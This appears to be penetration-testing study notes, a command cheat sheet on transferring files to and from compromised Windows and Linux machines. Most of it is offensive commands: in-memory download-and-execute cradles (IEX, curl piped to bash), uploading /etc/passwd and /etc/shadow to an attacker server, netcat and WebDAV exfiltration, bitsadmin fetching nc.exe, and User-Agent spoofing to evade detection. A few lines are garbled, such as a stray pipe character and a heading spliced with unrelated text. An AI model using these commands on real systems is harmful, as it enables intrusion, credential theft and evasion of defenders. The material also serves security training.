
## File Transfers 
<br>

### Windows 
```
# Convert Using b64 and powershell 
  cat [file] V| base64 -w 0; echo 

  # Copy the above commands ouput contents to terminal of remote machine
  # In powershell 
  [IO.File]::WriteAllBytes("C:\Users\Public\id_rsa", [Convert]::FromBase64String("CONTENTS"))"

  # Check file was decoded properly by checking the hash matches the origional hash 


# Powershell Web Downloads 
  # The system.net.webclient class allows for web downloads 
  # https://docs.microsoft.com/en-us/dotnet/api/system.net.webclient?view=net-5.0
  (New-Object Net.WebClient).DownloadFile('<Target File URL>','<Output File Name>')

  # Using IEX we can leverage powershell to invoke fileless attacks (Using Memory instead)
  IEX (New-Object Net.WebClient).DownloadString('Web Executable')

  # Powershell 3 and later you can use Invoke-WebRequest (Alias: curl, iwr, wget)
  Invoke-WebRequest [web exe] -OutFile fileName

  # Further Powershell Download Cradles 
  https://gist.github.com/HarmJ0y/bb48307ffa663256e239


# Powershell Common Problems 
  1. IE first-launch: 
    -UseBasicPasring
    Invoke-WebRequest https://<ip>/PowerView.ps1 -UseBasicParsing | IEX

  2. "Could not establish trust relationship for the SSL/TLS secure channel"
    [System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true}


# SMB 
  1. Setup SMB servAer on attack box using smbserver.py
    sudo impacket-smbserver share -smb2support /tmp/smbshare -user test -password test

  2. Mount the share using the creds
    net use n: \\[ip]\share /user:test test


# FTP (Using pyftpdlib)
  1. Start python program and specify port you want to use 
    sudo python3 -m pyftpdlib --port [port typically 21 or 20]

  2. From the victim machine 
    (New-Object Net.WebClient).DownloadFile('ftp://[ip]/file.txt', 'C:\Users\Public\file.txt')

  3. If you dont have an interactive shell on victim machine you can create a file that contains ftp commands and pass that file to the ftp command to run
    ftp -v -n -s:file.txt


# Upload from Victim to Attack Machine 
  1. Base64 Encode and decode on Attack Machine 

  2. Python "uploadserver". Can upload files from vicitm machine to it. 
    python3 -m uploadserver
    # Download powershell upload ps1
    IEX(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/juliourena/plaintext/master/Powershell/PSUpload.ps1')
    # Upload file to remote machine 
    PS C:\htb> Invoke-FileUpload -Uri http://[ip]:[server port]/upload -File C:\Windows\System32\drivers\etc\hosts

  3. netcat on attack machine and sent post request from victim 
    nc -lvnp 8000
    # Set var == Data you want to send 
    $b64 = [System.convert]::ToBase64String((Get-Content -Path 'C:\Windows\System32\drivers\etc\hosts' -Encoding Byte))
    Invoke-WebRequest -Uri http://[ip]:8000/ -Method POST -Body $b64
  

# SMB Uploads - Using WebDAV (RFC 4918O 2. curl is the same but its -o not -O)
  SMB will first try to connect to a remote target using SMB, if that fails it will then try using HTTP. We can setup a WebDav server.

  1. Install python wsgidav cheroot

  2. Start wsdigav 
    sudo wsgidav --host=0.0.0.0 --port=80 --root=/tmp --auth=anonymous 

  3. Connect to share using DavWWWRoot 
    dir \\192.168.49.128\DavWWWRoot

  4. Upload from victim to attack 
    copy C:\local\file \\[attack ip]\DavWWWRoot\


# FTP upload 
  1. Start pyftpdlib - Specify --write for upload 
    sudo python3 -m pyftpdlib --port 21 --write

  2. Upload from Victim 
    (New-Object Net.WebClient).UploadFile('ftp://[ip]/ftp-hosts', 'C:\local\file\')

  3. Use text file with ftp commands (As shown above) if no interactive temrinal
```
<br>

### Linux File Transfer Methods 
```
# Base64 Encode and Decode 
  1. Encode b64
    cat [file want to decode] | base64 -w 0; echo 
  
  2. Copy output, paste into receiving terminal, decode 
    echo -n "b64 output" | base64 -d > fileName 

  3. Note: Check hash of file b4 and after to ensure integrity 


# Web Downloads (wget and curl)
  1. wget 
    wget https://[remote file name] -O outputFileName

  2. curl is the same but its -o not -O


# Fileless web downloads (Run in memory)
  1. Curl 
    curl https://[web download] | bash

  2. wget 
    wget -qO- https://[web download] | python3 


# Download with Bash (/dev/tcp)
  1. Connect to target webserver
    exec 3<>/dev/tcp/[ip]/[port]

  2. Get request 
    echo -e "GET /[file] HTTP/1.1\n\n">&3 

  3. Print Response 
    cat <&3 


# SSH downloads 
  1. Start SSH and check if your pc is listening 
    sudo systemctl start ssh
    netstat -lnpt 

  2. Use SCP to download file to and from 
    scp root@[ip]:/dir/to/file.txt . 
    scp /file/to/download.txt root@[ip]:/location/to/go/to 
```

<br>

### Linux Upload Methods 
```
# Python uploadserver.py
  1. Install uploadserver 
    sudo python3 -m pip install --user uploadserver

  2. Create self-signed cert
    openssl req -x509 -out server.pem -keyout server.pem -newkey rsa:2048 -nodes -sha256 -subj '/CN=server'

  3. Make new dir
    mkdir https && cd https

  4. Start server
    sudo python3 -m uploadserver 443 --server-certificate ~/server.pem

  5. Upload from victim machine 
    curl -X POST https://[attacker ip]/upload -F 'files=@/etc/passwd' -F 'files=@/etc/shadow' --insecure


# Start up Mini webserver 
  1. python3 
    python3 -m http.server

  2. python2.7
    python2.7 -m SimpleHTTPServer

  3. PHP
    php -S 0.0.0.0:8000 

  4. ruby 
    ruby -run -ehttpd . -p8000 

  5. From attacker machine 
    wget [victim ip]:8000/file.txt 
```

<br>

### Transferring Files with Code 
```
# Python 
  1. Python 2
    python2.7 -c 'import urllib;urllib.urlretrieve ("[url]", "LinEnum.sh")'

  2. Python 3 
     python3 -c 'import urllib.request;urllib.request.urlretrieve("[url]", "LinEnum.sh")'


# PHP
  1. File_get_contents()
    php -r '$file = file_get_contents("[url]"); file_put_contents("LinEnum.sh",$file);'

  2. Fopen()
    php -r 'const BUFFER = 1024; $fremote = 
fopen("[url]", "rb"); $flocal = fopen("LinEnum.sh", "wb"); while ($buffer = fread($fremote, BUFFER)) { fwrite($flocal, $buffer); } fclose($flocal); fclose($fremote);'

  3. Fileless
    php -r '$lines = @file("[url]"); foreach ($lines as $line_num => $line) { echo $line; }' | bash


# Ruby 
  ruby -e 'require "net/http"; File.write("LinEnum.sh", Net::HTTP.get(URI.parse("[url]")))'


# Perl
  perl -e 'use LWP::Simple; getstore("[url]", "LinEnum.sh");'


# JavaScript 
  1. https://superuser.com/questions/25538/how-to-download-files-from-command-line-in-windows-like-wget-or-curl/373068
    Full Command > cscript.exe /nologo wget.js https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/dev/Recon/PowerView.ps1 PowerView.ps1


 # VBScript 
  1. https://stackoverflow.com/questions/2973136/download-a-file-with-vbs
    Full Command > cscript.exe /nologo wget.vbs https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/dev/Recon/PowerView.ps1 PowerView2.ps1


# Python Upload Operation 
  1. Start Py server 
    python3 -m uploadserver

  2. Upload One liner 
    python3 -c 'import requests;requests.post("http://[ip]:[port]/upload",files={"files":open("/etc/passwd","rb")})'
```

<br>

### Miscellaneous File Transfer Methods (Netcat, Ncat, RDP)
```
# Netcat 
  A tool that allows you to read and write from network connections using TCP or UDP. Netcat was made in 1995 but never maintained. Ncat was made in its place to support newer security protocols

# File transfer using ncat and netcat 
  1. On comprimised machine start netcat and have it listen on a port. This command also redirects the standard output to a file. 
    nc -l -p 8000 > file.exe
    Use the flag "--recv-only" if using ncat

  2. From the attack machine we can upload a file using netcat. Specify "-q 0" to tell the program to turn off after the file has been uploaded. We pass the file we want to send into standard in 
    nc -q 0 [ip] [port] < fileToSend.txt
    Use the flag "--send-only" if using ncat 


# Sending to comprimised machine using netcat 
  1. This technique is useful when the comprimsed machine has a firewall that is blocking inbound connecitons. If we can use an open port, we can push data through it. 
    sudo nc -l -p [open port ] -q 0 < fileToSend.exe

  2. On the attack machine, accept the input 
    nc [ip] [port] > nameOfNewFile.exe


# Sending to comprimised machine using ncat 
  sudo ncat -l -p [open port] --send-only < fileToSend.exe 

  ncat [ip] [port] --recv-only > newFileName.exe


# If ncat or netcat are not at our disposal, try using "/dev/TCP"
  1. Send file to comprimised machine 
    sudo nc -l -p 443 -q 0 < fileToSend.exe 

  2. Output tcp into file 
    cat < /dev/tcp/[sender ip]/[port used] > newFileName.exe


# Powershell Session File Transfer (Win RM) (Ports: 5985 & 5986)
  1. Requires the user to have admin access, and be a member of the remote management users 

  2. Test Connection to remote pc 
    Test-NetConnection -ComputerName [remotePC] -Port 5985 

  3. Create Remote Session 
    $Session = New-PSSession -ComputerName [remotePC]

  4. Copy Files 
    Copy-Item -Path C:\[fileToSend.exe] -ToSession $Session -Destination C:\[location]
    Do "-FromSession" if going the other way 


# RDP  (rdesktop and xfreerdp)
  1. Mounting a Linux folder to a remote Machine using rdesktop
    rdesktop [remote ip] -d HTB -u [username] -p [password] -r disk:linux='[dir to files]'

  2. Mounting using xfreerdp 
    xfreerdp /v:[remote ip] /d:HTB /u:[username] /p:[password] /drive:linux,[dir to files]

  3. Access remote share by going to File Explorer > \\tsclient\linux

  4. If you are transferring from Windows to Windows you can use mstsc.exe
```

<br>

### Protected File Transfers 
```
# While transporting sensitive files across the network it would be wise to use some kind of encryptions. But someitmes you dont have that at your dispoal. 

# Solutions - https://www.powershellgallery.com/packages/DRTools/4.0.3.4/Content/Functions%5CInvoke-AESEncryption.ps1
  1. Invoke-AESEncryption.ps1
    Invoke-AESEncryption -Mode Encrypt -Key "password" -Text "Text you want to encrypt"
    Invoke-AESEncryption -Mode Decrypt -Key "password" -Text "Text you want to decrypt" 

    Invoke-AESEncryption -Mode Encrypt -Key "password" -Path "/path/to/file.txt"
    Invoke-AESEncryption -Mode Decrypt -Key "password" -Path "/path/to/file.txt"

  2. Use aformentioned file transfer methods to move this file from host to host. And use the following command to import it.
    Import-Module .\Invoke-AESEncryption

  3. In linux we can use OpenSSL to encrypt 
    openssl enc -aes256 -iter 100000 -pbkdf2 -in /etc/passwd -out passwd.enc
    openssl enc -d -iter 100000 -pbkdf2 -in passwd.end -out passwd


```

### Catching files over http (nginx)
```
  1. Create directory that will handle the file uploads 
    sudo mkdir -p /var/www/uploads/SecretUploadDirectory


  2. Change the owner of that dir 
    sudo chown -R www-data:www-data /var/www/uploads/SecretUploadDirectory


  3. Create and popluate nginx config file.
    /etc/nginx/sites-available/upload.conf 
    server {
      listen 9001;
      
      location /SecretUploadDirectory/ {
          root    /var/www/uploads;
          dav_methods PUT;
      }
    }


  4. sym link the dir of the config file to nginx so it knows to use it. If there are other configs in the nginx dir then there will be errors. To avoid this remove any other config files in that dir, and use the diag commands provided below. 
    sudo ln -s /etc/nginx/sites-available/upload.conf /etc/nginx/sites-enabled/

    sudo systemctl restart nginx.service

    #Diag Commands to narrow down error
    tail -2 /var/log/nginx/error.log
    ss -lnpt | grep [port of hosted nginx]
    ps -ef | grep [pid of above command]


  5. Upload a file to the nginx server 
    curl -T /etc/passwd http://localhost:9001/SecretUploadDirectory/users.txt

    # verify upload 
    ls /var/www/uploads/SecretUploadDirectory/
```

<br> 

### Living Off the Land 
```
# The term "LOLBins" or "Living Off The Land Binaries" comes from binaries that an attacker can use to perform actions that were not origionally intended. LOLBins are also known as "misplaced trust binaries"
  1. Windows Bins: https://lolbas-project.github.io/#
  2. Unix Bins: https://gtfobins.github.io/

# Bitsadmin Download Function (BITS)
  1. bitsadmin /transfer wcb /priority foreground http://[ip]:[port]/nc.exe C:\Users\htb-student\Desktop\nc.exe

  2. With Powershell
    mport-Module bitstransfer; Start-BitsTransfer -Source "http://[ip]:[port]/nc.exe" -Destination "C:\Windows\Temp\nc.exe"
```


<br>

### Detection & Evading Detection 
```
# Explaination of User-Agent String 
  1. https://useragentstring.com/index.php

# Changing User Agent
  1. Invoke-WebRequest can change the user agent 
    #List out User agents 
    [Microsoft.PowerShell.Commands.PSUserAgent].GetProperties() | Select-Object Name,@{label="User Agent";Expression={[Microsoft.PowerShell.Commands.PSUserAgent]::$($_.Name)}} | fl

  2. Select agent
    $UserAgent = [Microsoft.PowerShell.Commands.PSUserAgent]::Chrome
    Invoke-WebRequest http://10.10.10.32/nc.exe -UserAgent $UserAgent -OutFile "C:\Users\Public\nc.exe"
```


